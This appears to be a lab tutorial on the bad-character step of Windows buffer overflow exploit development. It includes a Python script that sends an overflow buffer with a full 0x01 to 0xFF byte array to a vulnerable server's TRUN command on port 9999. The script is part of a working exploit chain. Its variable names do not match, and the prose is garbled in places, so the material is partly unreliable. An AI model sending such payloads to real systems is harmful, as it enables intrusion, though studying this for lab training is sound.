Talking about finding bad characters were nothing was just we were talking about something called as shell code.
When we genrate a shell code we need to know what were good for shell code & what were bad for the shell code suuch that the characters that we go to write a shell code program.
We can do it such as finding good & bad characters with the help running a group of Hex-Code characters and seeing them any were act on. So, in default we had something called Null Byte X 0 0 acts up. 
Open firefox in our kali or internet explorer in windows. Then search for "badchars" in search box. 
Now, copy the "badchars" in the website such as the bulbsecurity.com and copy the total badchars.
Now, open the kali linux terminal and then open the previous 2.py program and do paste the "badchars" above the shellcode and then remove the null code such as " \x00 " an then run it so what we are doing was we are running the all bad charcters so we can find our good and bad chars for our shell code.
Let's see the edited 2.py program below


-----------------------------------------
2.py:-
------------
#!/usr/bin/python
import sys, socket


badChars = (
"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
"\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f"
"\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f"
"\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f"
"\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f"
"\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf"
"\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf"
"\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef"
"\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
)

shellcode = "A"  *  2003  +  "B"  *  4  +badchars

try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.1.90',9999))
	s.send(('TRUN  /.:/'  +  shellcode))
	s.close()
except:
	print  "Error connecting to server "
	sys.exit()
-----------------------------------------
Now we have to remeber that what was the ending letters. Here the ending alphabets/letters were FF. So, then execute the above program before running it make sure that the DEBUGGER was running or not. 
Now, here what we need to do was run the program and switch to the IMMUNITY DEBUGGER in our windows machine. So there see the REGISTER Window in the DEBUGGER tool.
So now see the EIP in register window then we should see the main thing such as "Hex dump" which was the main in this step. So, see the Hex dumb carefully. So inorder to see the Hex dump we should select the ESP which was having some value. So, select it and give a right click on the ESP register of the STACK and then in the options you have to select the option such as "Follow in Dump" option and then as a result you can see that when you click on Follow in Dump then the values were changed to something and this something was nothing but the BAD CHARS what we pasted in our program such as 2.py.

Here in the "Hex dump" please see each and every number number was framed as Hex code type. So go with whole list nd you should see thing which was the last one like FF FF and then it was it.
So, here in this Hex dump we were not having any of the bad characters. If you had a bad characters then how you can find it was if the values are missing then we could conclude it as a bad characters were present. So, let's see the below example for bad characters inorder to see what a bad characters were.

Good characters:- 
00	01	02	03	04	05	06	07	08	09	0a	0b	0c	0d	0e	0f	10	11	12	13	14	15	16	17	18	19	1a	1b	1c	1d	1e	1f	20	21	22	23	24	25	26	27	28	29	2a	2b	2c	2d	2e	2f	30	31	32	33	34	35	36	37	38	39	3a	3b	3c	3d	3e	3f	40	41	42	43	44	45	46	47	48	49	4a	4b	4c	4d	4e	4f
50	51	52	53	54	55	56	57	58	59	5a	5b	5c	5d	5e	5f		60	61	62	63	64	65	66	67	68	69	6a	6b	6c	6d	6e	6f	70	71	72	73	74	75	76	77	78	79	7a	7b	7c	7d	7e	7f	80	81	82	83	84	85	86	87	88	89	8a	8b	8c	8d	8e	8f
90	91	92	93	94	95	96	97	98	99	9a	9b	9c	9d	9e	9f	a0	a1	a2	a3	a4	a5	a6	a7	a8	a9	aa	ab	ac	ad	ae	af	b0	b1	b2	b3	b4	b5	b6	b7	b8	b9	ba	bb	bc	bd	be	bf	c0	c1	c2	c3	c4	c5	c6	c7	c8	c9	ca	cb	cc	cd	ce	cf	d0	d1	d2	d3	d4	d5	d6	d7	d8	d9	da	db	dc	dd	de	df
e0	e1	e2	e3	e4	e5	e6	e7	e8	e9	ea	eb	ec	ed	ee	ef	f0	f1	f2	f3	f4	f5	f6	f7	f8	f9	fa	fb	fc	fd	fe	ff

So here we are having good characters above which mean that in our "Hex dump" no number was been missing so from 0-255 there was no character missing it mean that they all were good characters in case if a number was missing let it be 13 so we can conclude that 13 was a bad character so we can see the bad character list down below.

Bad characters list:-
01 02  03 B0  B0  06  07  08
09 0A 0B  0C 0D  0E  0F 10

So up there we were missing the character / numbers such as 04 & 05 it mean that we can conclude that 04 & 05 were the bad characters. 
It may not be B0 always sometimes it may vary from other so one thing that you should keep in yours mind was PLEASE MAKE AN EYE TEST WHILE YOU WERE GOING WITH BUFFER OVERFLOWS which mean that there was an replacement for a character either it be B0 or anything else. 
So even missing 1 bad character will cause you  a serious trouble that leads to buffer overflow crash. Now, after a good screening you need to write down the all BAD CHARACTERS that were found on a PAPER or NOTEPAD.